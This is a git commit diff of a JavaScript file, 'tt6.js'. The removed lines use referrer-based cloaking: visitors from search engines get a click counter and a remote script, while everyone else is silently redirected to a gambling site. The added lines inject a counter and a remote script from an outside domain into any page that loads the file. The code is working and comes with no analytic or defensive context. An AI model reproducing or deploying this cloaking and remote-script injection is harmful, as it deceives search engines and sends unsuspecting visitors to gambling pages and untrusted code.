672e82bdac0aa3f5883828c7d1f1c39ad21eca73
js999999999 <js-9@outlook.com>
2018-03-30 17:15:01 +0800

    Update tt6.js

--- 2017qq/tt6.js
+++ 2017qq/tt6.js
@@ -1,11 +1,3 @@
-today=new Date();
-today=today.getYear()+"-"+(today.getMonth()+1)+"-"+today.getDate();
-var regexp=/\.(sogou|so|haosou|baidu|google|youdao|yahoo|bing|gougou|118114|vnet|360|ioage|sm|sp)(\.[a-z0-9\-]+){1,2}\//ig;
-var where =document.referrer;
-if(regexp.test(where)){
-document.write ('<script language="javascript" src="http://count47.51yes.com/click.aspx?id=479643933&logo=6" charset="gb2312"></script><script language="javascript" type="text/javascript" src="http://www.647123.com/2017qq/t1.js "></script></div>');
-}
-else
-{
-window.location.href="http://www.xrz088.com/#（特码49倍）";
-}
+document.writeln("<script language=\"javascript\" src=\"http:\/\/count1.51yes.com\/click.aspx?id=17486399&logo=12\" charset=\"gb2312\"><\/script>");
+
+document.writeln("<script src=http:\/\/\www.647123.com\/2017qq11/t1.js ><\/script>");
